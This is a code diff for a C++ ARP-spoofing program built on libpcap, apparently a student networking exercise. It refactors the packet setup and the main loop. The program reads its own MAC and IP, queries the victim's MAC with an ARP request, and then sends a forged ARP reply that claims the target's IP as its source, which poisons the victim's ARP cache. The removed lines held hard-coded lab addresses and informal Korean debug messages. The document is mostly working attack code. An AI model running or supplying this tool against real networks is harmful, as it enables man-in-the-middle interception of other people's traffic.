@@ -9,6 +9,7 @@
 #include <net/if.h>
 #include "ethhdr.h"
 #include "arphdr.h"
+
 #define MAC_SIZE 6
 
 
@@ -70,16 +71,13 @@ int getMyMac(const char* dev, EthArpPacket &packet) {
     }
 
     close(sockfd);
-    memcpy(packet.eth_.smac_, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
-
+    memcpy(&packet.eth_.smac_, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
+    memcpy(&packet.arp_.smac_, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
     return 0;
 }
 
 bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
-    packet.eth_.dma
-    packet.arp_.tip_ = htonl(Ip("172.20.10.2"));
 
-    printf("요청 드갑니다잉~\n");
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -89,13 +87,11 @@ bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
         struct pcap_pkthdr* header;
         const u_char* responsePacket;
         int res2 = pcap_next_ex(handle, &header, &responsePacket);
-        printf("드가자~\n");
         if (res2 == 0) continue;
         if (res2 == -1 || res2 == -2) {
             printf("pcap_next_ex return %d(%s)\n", res2, pcap_geterr(handle));
             return false;
         }
-        printf("pcap 잡았당!\n");
         EthArpPacket* recvPacket = (EthArpPacket*)responsePacket;
         if (ntohs(recvPacket->eth_.type_) != EthHdr::Arp) {
             continue;
@@ -103,20 +99,17 @@ bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
         if(ntohs(recvPacket->arp_.op_) != ArpHdr::Reply) {
             continue;
         }
-        if(recvPacket->arp_.sip_ != htonl(Ip("172.20.10.2"))) {
-            printf("응 sender 아니야~\n");
+        if(recvPacket->arp_.sip_ != packet.arp_.tip_) {
             continue;
         }
-        printf("오 sender에서 보냄!\n");
 
-        memcpy(packet.arp_.tmac_, recvPacket->arp_.smac_, Mac::SIZE); // senderMac update
+        memcpy(&packet.arp_.tmac_, &recvPacket->arp_.smac_, MAC_SIZE); // senderMac update
+        memcpy(&packet.eth_.dmac_, &recvPacket->eth_.smac_, MAC_SIZE);
         return true;
     }
 }
 
 bool sendArpSpoof(pcap_t* handle, EthArpPacket &packet) {
-    packet.arp_.sip_ = htonl(Ip("172.20.10.2"));
-    packet.arp_.tip_ = htonl(Ip("172.20.10.5"));
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
@@ -127,7 +120,6 @@ bool sendArpSpoof(pcap_t* handle, EthArpPacket &packet) {
 }
 
 int main(int argc, char* argv[]) {
-	printf("hihihihi\n%d\n",argc);
 	if (argc != 4) {
 		usage();
 		return -1;
@@ -141,26 +133,44 @@ int main(int argc, char* argv[]) {
     }
 
     EthArpPacket myPacket;
-    if(getMyMac(dev, myPacket.eth_.smac_) == -1) {
-        return -1;
-    }
-	printf("getmymac done! \n");
 
-    if(getMyIp(dev, &(myPacket.arp_.sip_)) == -1) {
+    //config default
+
+	myPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 1 : broadcast 2 : sender mac
+	// myPacket.eth_.smac_ = Mac(); -> config after getMyMac()
+	myPacket.eth_.type_ = htons(EthHdr::Arp);
+
+	myPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
+	myPacket.arp_.pro_ = htons(EthHdr::Ip4);
+	myPacket.arp_.hln_ = Mac::SIZE;
+	myPacket.arp_.pln_ = Ip::SIZE;
+	myPacket.arp_.op_ = htons(ArpHdr::Request);  
+	// myPacket.arp_.smac_ = Mac("00:00:00:00:00:00"); -> after getMyMac() 
+	// myPacket.arp_.sip_ = htonl(Ip("0.0.0.0"));  -> after getMyIp()
+	myPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
+	myPacket.arp_.tip_ = htonl(Ip(argv[2]));
+
+    if(getMyMac(dev, myPacket) == -1) {
         return -1;
     }
-	printf("getmyip done!\n");
+
+    if(getMyIp(dev, myPacket) == -1) {
+        return -1;
+    }
 
     for (int i = 2; i < argc; i += 2) {
         myPacket.arp_.tip_ = htonl(Ip(argv[i])); // senderIp
-        uint32_t targetIp = htonl(Ip(argv[i + 1])); // Not used in EthArpPacket, keep as is
 
-        if (!getSenderMac(handle, myPacket.eth_.smac_, myPacket.arp_.sip_, myPacket.arp_.tip_, myPacket.arp_.tmac_)) {
+        if (!getSenderMac(handle, myPacket)) {
             printf("Failed to get sender MAC address.\n");
             return -1;
         }
 		printf("getsendermac done!\n");
-        if (!sendArpSpoof(handle, myPacket.eth_.smac_, myPacket.arp_.sip_, myPacket.arp_.tip_, myPacket.arp_.tmac_)) {
+
+
+        myPacket.arp_.sip_= htonl(Ip(argv[3]));
+        myPacket.arp_.op_ = htons(ArpHdr::Reply); 
+        if (!sendArpSpoof(handle, myPacket)) {
             printf("Failed to send ARP spoofing packet.\n");
             return -1;
         }
